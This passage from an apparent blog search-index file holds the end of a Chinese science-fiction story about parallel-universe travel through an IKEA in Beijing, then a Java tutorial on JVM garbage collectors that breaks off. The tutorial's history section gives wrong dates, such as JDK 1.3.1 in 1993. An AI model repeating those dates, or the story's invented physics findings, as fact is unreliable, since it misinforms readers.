法准确地形容这个地方——一个巨大的圆形空间，毋庸置疑是在很深的地底，因为我看到电梯的竖井从高处的天花板直接下垂到地面。嗯，看起来这里像是一个大型数据控制中心，到处都是控制台以及计算机服务器——哦，我猜那应该是计算机服务器吧，尽管尺寸比我印象中的要大许多许多，不过毕竟在习惯了远程使用亚马逊提供的专业云计算服务之后，我已经很久没有见过真实的服务器到底长什么样子了。\n\n远处还有几个噪音和体积都很可观的奇怪装置，我的第一反应是大型强子对撞机或者粒子加速器，虽然我只在图片上见过它们长什么样子。我瞥见一些仪器的商标是洛克希德马丁或安捷伦科技，但更多的商标我则从来都没有见过。我清楚地记着自己当时的感觉——竭尽全力保持呼吸顺畅脚步平稳眼神坚定，就好像这些东西都是每天司空见惯的一样，但是心跳，则丝毫不加掩饰地表露着我无比兴奋又夹杂恐惧的心情，我没细数，但每分钟一百次绝对应该算是下限了。\n\n电梯的竖井看起来位于这座圆形地下控制室的圆心位置，我跟着前辈的步伐，穿过各种巨大的仪器和装置，来到了控制室的边缘，一个看起来像是标准宜家货运电梯的门口。\n\n“嗨，”前辈向货梯门口几个穿着宜家客户服务工作服、手持各种设备的人点点头打了个招呼，然后指了指我说，“我朋友，北京来的，带他领略一下飞路粉。”\n\n那几个人友好地冲我笑了笑，其中一个皮肤特别白皙、留着淡金色齐肩卷发的小伙子还同我握了握手，操着标准的加州口音说：“噢，北京？想回家看看吗？”\n\n“啊，你好，呵呵，当然想了……”我礼貌性地笑了笑，正在琢磨着满腹的疑问怎么开口，这时，前辈已经迈步走进缓缓打开门的货梯，然后冲我挥了挥手。我无奈地耸耸肩，打住了就在嘴边的问题，跟着前辈走进了货梯。\n\n在货梯门缓缓关上的时候，那个金发小伙子冲我们眨了眨眼，说了句：“一会儿见，等你们从北京回来！”\n\n货梯门缓缓关闭，开始平稳地向上驶去，瑞典肉丸的宣传画旁边是宜家家居那个著名的客户服务海报，你知道，就是那个可爱又诡异地张开双臂的小心脏。\n\n嗡……货梯停了下来，门缓缓打开，刚才的灯火通明已经消失得无影无踪，取而代之的是一片在我意料之外的黑暗。\n\n我狐疑地看了看前辈。\n\n“请吧。”他说，然后做了一个请的手势。\n\n我走出电梯，眼睛慢慢适应了黑暗，可以依稀看到这也是一个类似的控制室，各种仪器的指示灯在远处不停地摇曳和闪烁着。几个在大厅另一端似乎是值班的人抬起头看了看我们，然后挥了挥手，就继续把头埋在了巨大的监视器后面。\n\n“这边走。”前辈冲远处那几个人挥手打了个招呼之后，向左边走去。\n\n我紧跟在他的后面，心怦怦地跳着，脑中似乎预见到将要发生什么，但是又被自己想法的荒谬和无稽搞得惴惴不安。\n\n前辈推开一扇沉重的防火门，一阵凉风迎面吹来，转眼，我们站在了一栋建筑屋顶的室外防火梯顶端，头顶是被雾霾笼罩着的看不到繁星的夜空，眼前则是一条熟悉的高架桥，脚下这个蓝色的建筑上赫然挂着几个黄色的大字，虽然由于角度关系我并不能完全看清楚，但是我确凿地知道上面写的是什么。\n\nHoly shit，我们此刻站在北京东四环边上的宜家家居楼顶！\n\n前辈冲瞠目结舌的我笑了笑，“欢迎来到魔法世界，现在我给你呈上……”他低头看了看表，然后完成了这句话，“明天凌晨4点钟的北京！”\n\n我不知道我这种完全傻掉了的表情维持了多久，直到前辈拍了拍我的肩膀，“怎么样，麻瓜有什么问题要问吗？”\n\n我拙劣的文笔让我没有办法将我当时的心情恰如其分地表达出来——怎么说呢，就好像当了一辈子被万有引力束缚的人，一觉醒来之后却突然发现自己变成了一只甲虫，对这个世界所有的认知在刹那间被彻底颠覆，然后醍醐灌顶般领悟到，原来宇宙中最最重要的物理规则是能让自己在水面上自由行走而不会掉下去的表面张力啊，至于重力，见鬼，应该算是宇宙中最无关紧要的东西了吧！\n\n我当然不会愚蠢到会像一只甲虫一样从宜家家居的楼顶飞下去，毕竟，我是一个理性的人，我坚信这个世界上没有魔法，如果我无法理解这一切，那一定是我的认知能力不够而已。于是我从卡夫卡状态切换回来，扭过头望着前辈，然后把我一路上的猜测、疑惑和不解融合成了一句话：“你们是怎么做到的？”\n\n“哈哈，解密黑魔法的时刻到了。”他踱步到我前面，望着空旷的四环主路，将身体前倾，半倚着栏杆，然后缓缓地点燃了一支烟。\n\n我一语不发地注视着他每一个细微的举动，因为我知道接下来听到的每一句话，都将彻底地改变我的世界观。\n\n“让我们从波粒二项性这个最熟悉的话题谈起吧——我希望你的高中物理老师给你讲过这一段历史。”他吸了一口烟，掸落了些许烟灰，“现在想一想，一个能让牛顿、麦克斯韦、赫兹、汤姆逊、爱因斯坦、康普顿、德布罗意这些伟大的头脑为此争论不休的话题，注定会有一个不可思议的结局。”\n\n前辈用了一串人类历史上光辉不朽的名字开场，想必这会是一个不凡的故事吧，我想。\n\n“从光开始，双缝实验和麦氏理论揭示出其波动性，光电效应和康普顿效应又清晰地证明了其粒子性，而就在这一场论战还烽烟四起未见分晓时，20世纪初的量子革命又把电子推到了这场争论的风口浪尖。”他沉默了一小会儿，似乎在酝酿着什么，“玻尔的跃迁，原子光谱，海森堡矩阵，差点就把电子的粒子性盖棺定论了，但天晓得薛定谔从哪儿搞出了那套方程，居然离奇地全面翻盘，重新把波动性的标签贴回了电子身上。然后就有了让全世界物理学教授都头疼得要命的EPR悖论（爱因斯坦-波多尔斯基-罗森悖论）以及薛定谔那只著名的猫。”\n\n他回头看了我一眼，确定我依旧在跟着他的思路之后，他吸了口烟，继续说道：“然后这帮天才给了我们这样一个解释，当我们不去看那个该死的电子时，它便像一个幽灵一般按照波函数向四周发散开去，虚无缥缈的概率波严格地按照薛定谔波动方程的指使飘浮在空间里，但见鬼的是，当你睁开眼睛去看它的时候，幽灵就突然消失了，波函数立刻按照那时候的概率分布坍塌，其他地方的概率统统变成0，而电子则好整以暇地出现在一个点上，此处概率则为百分之一百，呵呵，这就是所谓的概率波‘坍塌’，哥本哈根学派那帮人这个词用得倒真是很形象。”他耸了耸肩。\n\n我虽然不精通量子物理，但硬核科幻小说还是看过几本的，对这些著名的量子物理学理论自然也明白其大概的意思，但我实在想象不出这些写在全世界每一本高等物理课本中的东西，和我们刚刚经历的不可思议的时空穿梭有什么关系。\n\n没等我抛出问题，前辈转过身来看着我，指着身后天空中朦胧的半轮月亮说：“按照他们的解释，如果我们转过头不去看月亮，组成月亮的这么一大堆粒子就会按照波函数弥散开去，但是只要你一回头，那一轮明月就又完好如初地悬挂在空中，似乎什么都没有发生过一样……”他把烟蒂掐灭，指着身后月亮的方向，笑着问，“杰克，她还在吗？”\n\n我被他的幽默逗笑了，于是说：“其实哥本哈根学派的鼻祖在东方，一个15世纪的中国哲学家曾经说过一句有名的话：‘你若未观测此花，此花并未真实地存在，按波函数而归于寂；你来观测此花时，则此花波函数发生坍缩，它的颜色一时变得明白起来。’”\n\n“噢？真的？他说花按照波函数发生坍塌？”前辈有点不可思议地扬了扬眉毛。\n\n“差不多吧，你知道他说的是古汉语啦……”我含混其词。\n\n“中国的古代哲人真是了不起啊……”前辈啧啧作叹，“嗯，不管怎样，这种解释遇到了两个致命的问题，第一就是波函数坍塌的原因。按照哥本哈根学派的解释，即‘观测者’的意识造成了波函数的坍塌，那么如何去定义‘观测者’呢？想必你听说过‘薛定谔的猫’吧。”\n\n我没有打断他，心中倒是默默地想起了刘慈欣的那本《球形闪电》。\n\n“即便假设哥本哈根学派的解释是对的，”他继续说道，“那么，如果有两个从某个大粒子衰变而来的小粒子向相反的方向飞去，在我们没有观察它们之前，这两个粒子的自旋则应该都处在一种左/右均有可能的概率叠加当中，但若我们突然观察粒子A，则它的波函数就在一瞬间坍塌了，比如说，它选择了‘左’旋，那么由于两个粒子总体要守恒，则粒子B肯定就是‘右’旋了。同时呢，量子论的概率解释告诉我们，粒子A选择‘左’是一个完全随机的决定。那就奇怪了，假设当我们在观察A的时候，这两个粒子已经间隔了好几万光年这么远的距离，那么粒子A选择‘左’旋的决策是如何被以超光速的速度传送给粒子B，使得粒子B能够按照粒子A选择‘左’旋的这个抉择发生相应的坍塌而选择‘右’旋呢？你听明白了吗？”\n\n我点了点头，我很感谢他能把这些困扰着无数量子物理学天才几十年的复杂问题讲述得如此浅显易懂。\n\n“北京真冷。”他把手插到口袋里，远处四环主路的路灯熄灭，已经有零星的行人和车辆伴随着路边的清洁工人开始和巨大的城市一起，慢慢苏醒过来。\n\n“还好，我们就快要讲到最关键的部分了，我得快点儿讲，下午还有一个会呢……”他扔掉第二支烟。\n\n我点点头，继续倾听着。\n\n“因为哥本哈根关于波函数坍塌的这种解释带来了太多复杂的问题，于是一个叫做休·埃弗莱特的伟大物理学家提出了另外一种猜测——你有听说过休·埃弗莱特吗？没有？太遗憾了。不过没什么，再过一百年，估计这会是全世界所有历史课本上最重要的名字之一了。”前辈脸上露出了一丝遗憾的表情。\n\n“不管怎样，他的观点是，双缝实验中电子的波函数无需坍塌，而是继续保持左/右的叠加状态——当然，所有人都知道这和人们在现实世界中观测到的现象不符，但埃弗莱特的解释很大胆，他说当电子穿过双缝后，处于叠加状态的不仅仅是电子，还包括我们整个的世界！也就是说，当一个电子穿过双缝后，出现了两个叠加在一起的世界，其中的一个世界里，这个电子穿过了左边的缝隙；而在另一个世界里，这个电子则通过了右边的……”前辈笑着摇摇头，似乎到现在为止也不愿相信。\n\n“这就是埃弗莱特在上世纪50年代论文中提出的多世界解释。听起来很疯狂是不是？就因为一个电子，宇宙就多了一个！当然，它的优势显而易见，比如说薛定谔的猫再也不必为死活问题而困扰了——宇宙分裂成了两个就解决了问题，在一个宇宙里猫是活的，而在另一个宇宙里，猫直接就死翘翘了，不用等到观测者打开箱子让放射性粒子坍塌的那一刻。但它的劣势则更明显了，你大概也想到了，这个理论的成本未免也太大了一点，仅仅因为一粒电子在双缝实验中选择从左走还是从右走，我们就得多赔上一个世界……自然，埃弗莱特的理论因为上述的这个缺陷，在当时并未受到学术界的重视，而他本人更是逐渐退出了物理界，创立了著名的Lambda公司。唉，很多事就是这样，总是要等到多年以后回头再望时，经过重重的历史迷雾，你才会意识到曾经发生过的这些事情究竟有多么伟大。”说到这里，前辈自我解嘲地耸耸肩，笑着说，“唉，也许这就是我们和天才的区别吧……”\n\n我没有说什么，在清晨的凉风中，我突然感到了一种苍白的无力感和渺小感。\n\n“简单说一下多宇宙的概念。”前辈收拾了一下感慨的心情，“拿我们都很熟悉的二维笛卡尔平面来举例好了。在这样一个平面系统里，任何一个点都可以用一个包含两个变量的坐标（x，y）来表示，比如（1，2），这两个数字分别代表该点在x轴和y轴上的投影。同理，一个包含三个变量的坐标就可以描述一个三维空间中的点，而这三个变量分别代表该点在三个互相垂直的维度方向的投影。”前辈看了我一眼，做出一个“听懂了吗”的询问表情。\n\n我点点头予以回应。\n\n前辈缓缓抬起头，看着北京初秋渐渐泛出曙光的苍穹，放慢语速说道：“假设我们是一种没有维度的‘质点人’，我们的生命体就是一个点，而且只能在一个维度上做直线运动，这么说吧，我们这群‘质点人’生活的世界就是笛卡尔平面坐标系中的x轴，我们能感知到这条直线上的东西，而对别的一无所知。让我们再假设真实的宇宙是一个悬在二维平面上的点，比如矢量（1，2）好了，那么对于生活在x轴上的我们来说，我们对真实宇宙的感知只是其在x轴上的投影1而已，我们完全不知道其实真实的宇宙还有一个长度为2的y轴投影。假设有另外一群和我们一样的质点人生活在y轴上，同样，他们对真实宇宙的感知则只有投影在他们世界里的那个2而已。又因为我们生活的x轴世界和他们生活的y轴世界相互垂直，所以两个世界之间没有任何投影，因此我们完全不知道对方世界的存在，而且都偏执地认为自己生活的世界是真实的宇宙本身。其实呢，有幸生活在三维空间中的我们可以清楚地看到，这个真实的二维宇宙其实是x世界和y世界两个的叠加。”前辈的视线从苍穹转开，看着我露出恶作剧的笑容，说，“我们的宇宙也是如此。”\n\n我还来不及错愕，前辈继续说了下去：“最新的物理学研究表明，我们真实的宇宙是一个存在于非常高维的希伯特空间命名，在量子力学中，一个物理系统可以表示为一个复希尔伯特空间，其中的向量是描述系统可能状态的波函数中的一个矢量，和刚才那个例子一样，这个高维空间是由无数个低维世界所构成的，而每个低维世界都只能感受到真实宇宙的矢量在其中的投影而已，所以，对于每个世界而言，宇宙都不相同，而宇宙波函数则是严格按照薛定谔方程演化的叠加状态。”前辈停了下来，一脸郑重其事的表情说，“截至这里，是发展中国家所认知的物理学，而接下来是真正疯狂的事情。”\n\n天哪，我吐了吐舌头，敢情这些都是铺陈而已啊。\n\n“之前的物理学界认为，由于真实的宇宙存在于一个非常高维的空间，比如说1000亿维空间，那么假如我们生活的世界是四维的话，那它们之间则几乎必定是垂直的了，因此物理学家们认为我们的世界无法感知到其他的世界。”他笑了笑，“如你所愿，这里会有一个大大的转折——在2000年斯隆数字巡天（Sloan Digital Sky Survey）项目启动后，新墨西哥州的望远镜在短短几周内不仅收集到比天文学历史上总共收集的数据还要多得多数据，更带给了物理学家惊人的发现——是的，我们看到了其他世界在我们世界的投影。”\n\n我的嘴已经合不拢了，所有的科幻片都加起来也不及刚才这句话给我带来的感官冲击强烈。\n\n“当然，我们能探测到和计算出的宇宙还局限于在家谱树上离我们较近的那些——大概过去几十天分裂出去的其他分支而已，对于更早分裂出去的宇宙，我们则还一无所知。但是，既然已经证实多维宇宙的存在的理论为真，那么，了解那些从遥远的时代就和我们这个世界分道扬镳的宇宙则就都变成了单纯的技术问题，预计2016年在智利投入使用的大型视场全景巡天望远镜（Large Synoptic Survey Telescope）大约能让我们定位几百年前分裂出去的宇宙，在其中的某些宇宙中，也许哥伦布并没有发现美洲，或者拿破仑在滑铁卢之战中大获全胜呢……倘若我们有朝一日能突破140亿光年的视界，或许我们能找到更遥远时代就分裂出去的宇宙也说不定，真想知道6500万年前那颗陨石没有落到墨西哥湾的那个宇宙现在是什么样子啊……”前辈眼里充满了对未知的那种渴望和希冀。\n\n“嗯，你说的我大概明白了，但我还是好奇，这个理论和你们将我从加州隔空传送（我用的词是teleport，实在想不出更准确的描述了）到北京有什么关系？”我觉得有必要刨根问底一下。\n\n“哈哈，好问题。不过，我要纠正你一下，我们并没有把你从加州送到北京（他用了send这个词），只是把你从‘杰克此刻在加州’的那个宇宙送到了‘杰克此刻在北京’的那个宇宙而已。换句话说，我们没有把生活在x轴世界上的你从5移动到10，而是把你直接从x轴移动到了y轴，而幸运的是，在那个y轴世界里，”他揶揄地指了指我，“杰克此刻本来就在10，明白了吗？”\n\n“从‘杰克此刻在加州’的那个宇宙送到了‘杰克此刻在北京’的那个宇宙？好吧，我先不管你们是怎么做到这个的，我的问题是，那个之前生活在这个‘杰克此刻在北京’的宇宙中的杰克，现在怎么样了呢？”我心里有点儿莫名的不安了。\n\n“当然是正在和我说话啊！”前辈大笑起来，“确切地说，‘杰克此刻在北京’的那个宇宙在我们走出电梯的那一刹那发生了分裂，宇宙1中杰克依然在北京，但全然没有听过刚才我的那番长篇大论；而在宇宙2中，杰克不但在北京，而且刚刚被我的一番话所吓倒。等我们一会儿坐电梯离开的时候，宇宙2则继续分裂，一个变成杰克在北京没有离开的宇宙2.1，另一个变成杰克从北京消失了的宇宙2.2。当然，至于那个杰克从北京莫名消失的宇宙将何去何从，我们就不在乎了，毕竟还有那么多杰克压根儿就没有存在过的宇宙，对吧？”\n\n“听起来像是你们找了一个符合一定要求的平行宇宙，比如‘杰克此刻在北京’这个宇宙，然后像Unix系统中调用fork命令一样复制了这个宇宙，再把我当做信号量传了过来？那我的亲人和朋友呢？他们在这个宇宙中还存在吗？”我突然感到有点儿恐惧。\n\n前辈拍了拍我肩膀，“别担心，杰克，只要我们一会儿再回到来时的那个宇宙，那么，你的意识、记忆、感情，以及你朋友的意识、记忆和感情，都将没有任何变化。当然了，这么说也有点儿不对，毕竟在我们离开的这段时间里，我们来的那个宇宙已经发生了亿万次的分裂，确切地说，我们回去的只是那个宇宙亿万次分裂中的一个分支，毕竟，先哲说得好，一个人是无法两次踏进同一条河流的嘛……”前辈耸耸肩，“不过你放心，这亿万个宇宙之间的差别微乎其微，就像是纽约爱乐乐团录制的两张《命运交响曲》唱片一样，第一张里小提琴手在某一小节心血来潮地加了一段华彩，而第二张里没有，但谁也不能否认这两张唱片都是《命运交响曲》，对吧？”前辈轻松地笑了笑。\n\n我感觉自己的脑细胞似乎无法再追问下去了，“好吧，最后一个问题，这些东西关宜家什么事儿？”我实在是好奇这个。\n\n“哈哈哈哈……”前辈爽朗地笑了，“你倒想想看，若没有宜家做伪装，我们那些大型的仪器和装置放到什么地方去？另外，若是每天有一千多个来自世界各地的人凭空地在北京某个地方集体出现，你们北京人民还不得第一时间报警啊！当初宜家在北京选址时也充分考虑了这一点，这里离各国的使馆区都近，本来外国人就多，人们也就见惯不怪了，一千多人按照泊松分布出现在这里，没有人会觉察到异样的。”\n\n“每天一千个外国人用这种方法往返于北京和全球各地？”我惊诧居然没有任何人产生丝毫的怀疑。\n\n“对啊，所以你明白这项技术为什么迟迟不能被公开了吧。试想一下，如果这项技术落到了恐怖分子或者大毒枭手里……”前辈做了一个鬼脸，看了看表，示意我俩该回去了。\n\n“啊……好吧……倘若这项技术有朝一日能够被公之于众的话，那可真是时空的一场革命了，估计全球的客运海运公司就都得倒闭了……”我惊诧地说，跟在他后面往回走。\n\n“何止如此啊，偷渡问题从此之后就不止是在国境线严查死守了，这将彻底改变整个世界的地缘政治格局啊……”前辈忧心忡忡，顺便挥手向控制室里的几个人致意。\n\n“唉，对了，这个项目是什么时候开始的？”我俩踏进货梯。\n\n“哈哈，这个你应该比我清楚啊，北京新的宜家家居什么时候建成的？”\n\n前辈关上货梯门，“过去七年里，大概有超过一百五十万人次从发达国家通过宜家来往于北京和世界各地吧，而且我听说很多人都在北京置办了家业，你知道，金融危机之后，很多人想通过在第三世界花美元来降低自己的生活成本……”\n\n我仿佛突然明白了为何北京的房价和人民币汇率从2006年开始如此狂飙的原因了。\n\n货梯门打开，那个淡金色头发的哥们儿走过来，冲我们笑着说：“欢迎回来！”不知道是否是错觉，我总觉得他的头发颜色变深了，我是说，和我们踏上电梯前那个宇宙中的他相比。\n\n后来前辈送了我一张宜家飞路粉产品的会员卡，这就意味着我也可以使用宜家飞路粉来做世界旅行了。\n\n我和老婆商量之后，在2010年6月搬回了北京，虽然空气差了点儿，但毕竟生活更方便一些。我每天晚上11点都要去东四环宜家坐货梯班车到帕罗奥图，然后走101高速赶在当天早晨9点前去公司上班，我太太则辞掉工作，开了一家快递公司——虽然物品大小有严格要求，但是快速的投递时间和低廉的价格却有绝对优势。从2010年开始，每个周末我俩基本都不在家，而是去把全球有宜家的地方都逛了个遍——若不用考虑旅费和住宿的话，环球旅行其实真的不贵。\n\n2012年是一个特殊的年份，便携式飞路粉被研制出来，也就是说，平行世界旅行在没有宜家的宇宙中也可以进行了，这就意味着，去一个几千年，甚至几万年前就和我们当前宇宙分裂的宇宙中旅行，不再是一个幻想了。\n\n前辈对此兴奋不已——他之前总是为自己生活在一个已经基本没有未知死角的世界里感到惋惜，常常抱怨没有机会去参加真正的冒险，在得知便携式飞路粉推出的时候，他在第一时间去了一个五百年前分裂出的宇宙中冒险，回来后如痴如醉地对我说：“杰克，你小时候读过凡尔纳的小说吗？你有幻想过有一天能去一个完全陌生的世界里冒险的那种刺激吗？那是真正的未知世界啊，你想知道1492年哥伦布没有发现美洲的那个世界是什么样子的吗……”\n\n在前辈各种离奇故事的感染下，我和老婆终于被他的怂恿打动了，决定也要尝试一下这种诡异的旅行——唉，也许当初离开家来美国求学的事实，就证明了渴望看到更多世界的好奇心早就在我们的DNA里了。当然，这种旅行是有风险的——除了未知宇宙中种种无法预测的环境外，这么远的平行宇宙间信号量传递会有更大的误差，也就是说，即便一切顺利，我们也可能回到一个和出发时那个宇宙差别巨大的分支，拿前辈的话说，一盘再高保真的唱片，在被翻录过亿万次之后，听起来肯定会和第一张大相径庭，比如，据他说，他记忆中的我们就和眼前的我们有诸多的不同……\n\n不过怎么形容呢，就像在大航海时代被各种未知世界中意想不到的事情深深吸引的冒险家一样，虽然明明知道踏上那艘三桅帆船后，可能遭遇的命运除了发现新世界之外，也可能是葬身鱼腹，或流落荒蛮，但无法抑制的好奇心却总是占据上风，大概，这是所有冒险家的通病吧。\n\n今天是2013年6月28日，我们终于决定要踏上旅途。目标宇宙在一千年前与我们所在的宇宙发生分裂，据那些去过的人回来说，那是一个十字军东征大获全胜、文艺复兴提前两百年发生、全球信仰天主教的宇宙，还建议我们带上《古兰经》作为纪念品给那里的人们——据说那个宇宙里的学者只在历史文献的只言片语中听说过《古兰经》的名字，而从未亲眼见过……我希望，这会是一次极为有趣的冒险。\n\nP.S.不知道能不能够再回到这个宇宙中，所以，决定先将这篇文章发在博客上，等旅行回来后再做更新。\n\nP.S.S.不管你相信也好，不信也好，能在这个宇宙中认识你们，真好。","categories":["转载"],"tags":["科幻小说"]},{"title":"Java 进阶 08 —— JVM 垃圾回收器","url":"/java-advance/08-jvm-gc/","content":"\n## 垃圾回收器概述\n\n垃圾收集器没有在规范中进行过多的规定，可以由不同的厂商，不同版本的 JVM 来实现。\n\n由于 JDK 的版本处于高速迭代过程中，因此 Java 发展至今已经衍生了众多的 GC 版本。\n\n<!-- more -->\n\n从不同角度分析垃圾收集器，可以将 GC 分为不同的类型。\n\nJava 不同版本的新特性需要关注的点：\n\n- 语法层面，Lambda表达式，switch 表达式，自动装箱、拆箱，enum，<>，...\n- API 层面：Stream API，新的时间日期，Optional，String，集合框架\n- 底层优化：JVM 的优化，元空间，静态域，字符串常量池，GC 的变化，多语言的支持\n\n## 垃圾回收器的分类\n\n- 按线程数分，可以分为串行垃圾回收器（Serial Collector）和并行垃圾回收器（Parallel Collector）。\n\n  - 串行回收指的是在同一时间段内只允许有一个 CPU 用于执行垃圾回收操作，此时工作线程被暂停，直至垃圾收集工作结束。\n  - 在诸如单 CPU 处理器或者较小的应用内存等硬件平台不是特别优越的场合，串行回收器的性能表现可以超过并行回收器和并发回收器。所以串行回收器默认被应用在客户端的 Client 模式下的 JVM 中。\n  \n  - 在并发能力比较强的 CPU 上，并行回收器产生的停顿时间要短于串行回收器。\n  \n- 和串行回收相反，并行收集可以运用多个 CPU 同时执行垃圾回收，因此提升了应用的吞吐量，不过并行回收仍然与串行回收一样，采用独占式，使用了 STW 机制。\n  \n- 按照工作模式分，可以分为并发式垃圾回收器和独占式垃圾回收器。\n\n  - 并发式垃圾回收器与应用程序线程交替工作，以尽可能减少应用程序的停顿时间。\n  - 独占式垃圾回收器一旦运行，就停止应用程序中的所有用于线程，直到垃圾回收过程完全结束。\n\n- 按碎片处理方式分，可以分为压缩式垃圾回收器和非压缩式垃圾回收器。\n\n  - 压缩式垃圾回收器会在回收完成后，对存活对象进行压缩整理，消除回收后的碎片。（再分配对象空间使用指针碰撞）\n  - 非压缩式的垃圾回收器不进行这步操作。（再分配对象空间使用空闲列表）\n\n- 按工作的内存区间分，又可分为年轻代垃圾回收器和老年代垃圾回收器。\n\n## 评估 GC 的性能指标\n\n- **吞吐量**：运行用户代码的时间占总运行时间的比例\n  - 总运行时间：程序的运行时间 + 内存回收的时间\n- 垃圾收集开销：吞吐量的补数，垃圾收集所用时间与总运行时间的比例。\n- **暂停时间**：**执行垃圾收集时，程序的工作线程被暂停的时间**。\n- 收集频率：相对于应用程序的执行，收集操作发生的频率。\n- **内存占用**：Java 堆区所占的内存大小。\n- 快速：一个对象从诞生到被回收所经历的时间。\n\n吞吐量、暂停时间、内存占用，这三者共同构成一个不可能三角。三者总体的表现会随着技术进步而越来越好。一款优秀的收集器通常最多同时满足其中的两项。\n\n这三项里，暂停时间的重要性日益凸显。因为随着硬件发展，内存占用多些越来越能容忍，硬件性能的提升有有助于降低收集器运行时对应用程序的影响，即提高了吞吐量。而内存的扩大，对延迟反而带来负面的效果。\n\n简单来说，主要抓住两点：**吞吐量**和**暂停时间**。\n\n### 吞吐量（throughput）\n\n吞吐量就是 CPU 用于运行用户代码的时间与 CPU 总消耗时间的比值，即吞吐量 = 运行用户代码时间 / （运行用户代码时间 + 垃圾收集时间）\n\n- 比如：虚拟机总共运行了 100 分钟，其中垃圾收集花掉 1 分钟，那吞吐量就是 99%\n\n这种情况下，应用程序能容忍较高的暂停时间，因此，高吞吐量的应用程序有更长的时间基准，快速响应是不必考虑的。\n\n吞吐量优先，意味着在单位时间内，STW 的时间最短：0.2 + 0.2 = 0.4\n\n### 暂停时间（pause time）\n\n暂停时间是指一个时间段内应用程序线程暂停，让 GC 线程执行的状态\n\n- 例如，GC 期间 100 毫秒的暂停时间意味着在这 100 毫秒期间内没有应用程序线程是活动的。\n\n暂停时间优先，意味着尽可能让单次 STW 的时间最短：0.1 + 0.1 + 0.1 + 0.1 + 0.1 = 0.5\n\n### 吞吐量 vs 暂停时间\n\n高吞吐量较好因为这会让应用程序的最终用户感觉到只有应用程序线程在做”生产性“工作。直觉上，吞吐量越高程序运行越快。\n\n低暂停时间（低延迟）较好因为从最终用户的角度来看不管是 GC 还是其他原因导致一个应用被挂起始终是不好的。这取决于应用程序的类型，有时候甚至短暂的 200 毫秒暂停都可能打断终端用户体验。因此具有低的较大暂停时间是非常重要的，特别是对于一个交互式应用程序。\n\n不幸的是 ”高吞吐量“ 和 ”低暂停时间“ 是一对相互竞争的目标（矛盾）。\n\n- 因为如果选择以吞吐量优先，那么必然需要降低内存回收的执行频率，但是这样会导致 GC 需要更长的暂停时间来执行内存回收。\n- 相反的，如果选择以低延迟优先为原则，那么为了降低每次执行内存回收时的暂停时间，也只能频繁地执行内存回收，但这又引起了年轻代内存的缩减和导致程序吞吐量的下降。\n\n在设计（或使用）GC 算法时，我们必须确定我们的目标：一个 GC 算法只可能针对两个目标之一（即只专注于较大吞吐量或最小暂停时间），或尝试找到一个二者的折中。\n\n现在标准：在最大吞吐量优先的情况下，降低停顿时间。 \n\n\n## 不同的垃圾回收器概述\n\n### 垃圾收集器发展史\n\n有了虚拟机，就一定需要收集垃圾的机制，这就是 Grabage Collection，对应的产品我们称为 Garbage Collector。\n\n- 1993 年随 JDK 1.3.1 一起来的是串行方式的 Serial GC，它是第一款 GC。ParNew 垃圾收集器是 Serial 收集器的多线程版本。\n- 2002 年 2 月 26 日，Parallel GC 和 Concurrent Mark Sweep GC 跟随 JDK 1.4.2 一起发布。\n- Parallel GC 在 JDK 6 之后成为 HotSpot 默认 GC。\n- 2012 年，在 JDK 1.7u4 版本中，G1 可用。\n- 2017 年，JDK 9 中 G1 变成默认的垃圾收集器，以替代 CMS。\n- 2018 年 3 月，JDK 10 中 G1 垃圾回收器的并行完整垃圾回收，实现并行性来改善最坏情况下的延迟。\n- 2018 年 9 月，JDK 11 发布。引入 Epsilon 垃圾回收器，又被称为 ”No-Op“（无操作）\n- 2019 年 3 月，JDK 12 发布。增强 G1，自动返回未用堆内存给操作系统。同时，引入 Shenandoah GC，是一个低停顿时间的 GC（Experimental）。\n- 2019 年 9 月，JDK 13 发布。增强 ZGC，自动返回未用堆内存给操作系统。\n- 2020 年 3 月，JDK 14 发布。删除 CMS 垃圾回收器。拓展 ZGC 在 macOS 和 Windows 上的应用。\n\n### 7 款经典的垃圾回收器\n\n串行回收器：Serial、Serial Old\n\n并行回收器：ParNew、Parallel Scavenge、Parallel Old\n\n并发回收器：CMS、G1\n\n### 7 款经典的垃圾回收器与垃圾分代之间的关系\n\n新生代收集器：Serial、ParNew、Parallel Scavenge\n\n老年代收集器：Serial Old、Parallel Old、CMS\n\n整堆垃圾收集器：G1\n\n### 垃圾收集器的组合关系\n\n![垃圾收集器的组合关系](https://up-img.yonghong.tech/pic/2021/05/12-20-45-%E5%9E%83%E5%9C%BE%E6%94%B6%E9%9B%86%E5%99%A8%E7%9A%84%E7%BB%84%E5%90%88%E5%85%B3%E7%B3%BB-BZidDy.png)\n\n- 两个收集器间有连线，表明它们可以搭配使用：\n\n  Serial / Serial Old 、Serial / CMS 、ParNew / Serial Old 、 ParNew / CMS 、Parallel Scavenge / Serial Old 、Parallel Scavenge / Parallel Old 、G1\n\n- 其中 Serial Old 作为 CMS 出现 ”Concurrent Mode Failure“ 失败的后备预案。\n\n- （红色虚线）由于维护和兼容性测试的版本，在  JDK 8 时将 Serial + CMS、ParNew + Serial Old 这两个组合声明为废弃（JEP 173），并在 JDK 9 中完全取消了这些组合的支持（JEP 214），即，移除了这些组合。\n\n- （绿色虚线）JDK 14 中：弃用 Parallel Scavenge 和 Serial Old 组合（JEP 366）\n\n- （青色虚线）JDK 14中：删除 CMS 垃圾回收器（JEP 363）\n\n### 如何查看默认的垃圾回收器\n\n`-XX:+PrintCommandLineFlags` 查看命令行相关参数（包含使用的垃圾收集器）\n\n```shell\njava -XX:+PrintCommandLineFlags -version\n```\n\n使用命令行指令： jinfo -flag 相关垃圾回收器参数 进程 ID\n\n```shell\n$ jinfo -flag UseParallelGC 58951\n-XX:-UseParallelGC\n$ jinfo -flag UseParallelOldGC 58951\n-XX:-UseParallelOldGC\n$ jinfo -flag UseG1GC 58951\n-XX:-UseG1GC\n$ jinfo -flag UseConcMarkSweepGC 58951\n-XX:+UseConcMarkSweepGC\n```\n\n## 垃圾回收器介绍\n\n### Serial 回收器：串行回收\n\nSerial 收集器是最基本、历史最悠久的垃圾收集器了。JDK 1.3 之前回收新生代唯一的选择。\n\nSerial 收集器作为 HotSpot 中 Client 模式下的默认新生垃圾收集器。\n\nSerial 收集器采用复制算法、串行回收和 STW 机制的方式执行内存回收。\n\n除了年轻代之外，Serial 收集器还提供用于执行老年代垃圾收集的 Serial Old 收集器。Serial Old 收集器同样也采用了串行回收和 STW 机制，只不过内存回收算法使用的是标记-压缩算法。\n\n- Serial Old 是运行在 Client 模式下默认的老年代的垃圾回收器。\n- Serial Old 在 Server 模式下主要有两个用途：①与新生代的 Parallel Scavenge 配合使用 ②作为老年代 CMS 